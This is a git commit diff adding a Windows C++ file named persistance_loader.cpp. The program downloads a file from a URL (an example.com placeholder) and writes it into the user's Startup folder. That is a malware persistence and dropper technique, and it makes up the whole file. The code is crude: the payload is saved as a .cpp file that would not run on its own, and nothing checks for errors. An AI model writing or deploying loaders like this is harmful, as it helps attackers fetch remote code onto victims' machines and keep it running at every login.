094a1e52fa6422f63171583965705750cc409209
crossrepublic <71635944+ziminl@users.noreply.github.com>
2023-07-01 11:39:41 +0900

    Update persistance_loader.cpp

--- persistance_loader.cpp
+++ persistance_loader.cpp
@@ -1,1 +1,45 @@
 
+#include <windows.h>
+#include <wininet.h>
+#include <shlobj.h>
+
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "shell32.lib")
+
+#define BUFFER_SIZE 4096
+
+void DownloadFile(const char* url, const char* filename) {
+    DWORD bytesRead;
+
+    HINTERNET hInternet = InternetOpen(L"User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+
+    char buffer[BUFFER_SIZE];
+
+    HANDLE hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    do {
+        InternetReadFile(hConnect, buffer, BUFFER_SIZE, &bytesRead);
+        DWORD bytesWritten;
+        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
+    } while (bytesRead > 0);
+
+    CloseHandle(hFile);
+
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+}
+
+int main() {
+    char startupPath[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
+
+    const char* url = "http://example.com/file.cpp";
+
+    char filename[MAX_PATH];
+    sprintf(filename, "%s\\file.cpp", startupPath);
+
+    DownloadFile(url, filename);
+
+    return 0;
+}
